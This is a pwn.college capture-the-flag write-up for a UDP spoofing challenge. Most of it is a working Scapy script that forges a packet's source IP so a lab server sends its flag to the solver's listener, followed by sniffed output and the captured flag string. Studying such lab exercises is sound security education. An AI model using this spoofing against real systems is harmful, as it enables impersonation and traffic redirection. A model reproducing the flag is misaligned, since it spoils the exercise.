---
layout: page
title: "🛰️ UDP-spoofing-2 (pwn.college)"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 📝 Task Description

Sometimes developers implement TCP-like features over UDP, leading to scenarios where packets can be **spoofed** to appear from a different source.  
In this challenge, the server doesn’t return the flag directly — it sends it to a **specified IP and port**.

### 🎯 Goal:
Send a spoofed UDP packet to the challenge server that tricks it into sending the flag to your machine.

---

## 💡 Hint

- Use **UDP spoofing** to trick the challenge server into thinking the request came from **your IP**.
- To receive the flag:
  - Use `netcat` like: `nc -lu 12345`
  - Or use a Python sniffer
  - Or Wireshark

---

## ⚙️ Solution Code

```python
# udp.py
from scapy.all import IP, UDP, send, sniff
import sys

# Configuration
victim_server_ip = '10.0.0.2'        # Target server
our_listener_ip = '10.0.0.1'         # Where we want the flag sent
spoofed_src_ip = our_listener_ip
spoofed_src_port = 12345             # Port we listen on
victim_port = 31338                  # Challenge server's listening port

# Send spoofed packet to server
def send_pkt():
    print("[*] Sending spoofed packet...")
    pkt = IP(src=spoofed_src_ip, dst=victim_server_ip) / \
          UDP(sport=spoofed_src_port, dport=victim_port) / \
          b"FLAG:10.0.0.1:12345"
    send(pkt)
    print("[*] Packet sent!")

# Sniff for the incoming flag
def sniffer():
    def handle(pkt):
        if pkt.haslayer(UDP) and pkt[UDP].dport == spoofed_src_port:
            print("[+] Received flag!")
            print(f"Raw Data: {bytes(pkt[UDP].payload)}")
            pkt.show()
            sys.exit(0)

    print("[*] Sniffing for incoming flag...")
    sniff(filter=f"udp and port {spoofed_src_port}", prn=handle)

if __name__ == "__main__":
    send_pkt()
    sniffer()
```

### Example Output
```bash
[] Sending Packets....
.
Sent 1 packets.
Packet sent!
[]Sniffing packet..
Received Flag!
Raw packets : b'pwn.college{wvSXDSn97wha-gbnZhq42dUY-78.0VN0AjNxwSM0IzMyEzW}\n'
###[ Ethernet ]###
  dst       = c2:05:c5:bd:f8:58
  src       = 46:5f:19:29:89:e2
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 89
     id        = 32731
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0xa6b6
     src       = 10.0.0.2
     dst       = 10.0.0.1
     \options   \
###[ UDP ]###
        sport     = 31338
        dport     = 12345
        len       = 69
        chksum    = 0x1459
###[ Raw ]###
           load      = b'pwn.college{wvSXDSn97wha-gbnZhq42dUY-78.0VN0AjNxwSM0IzMyEzW}\n'
```

---
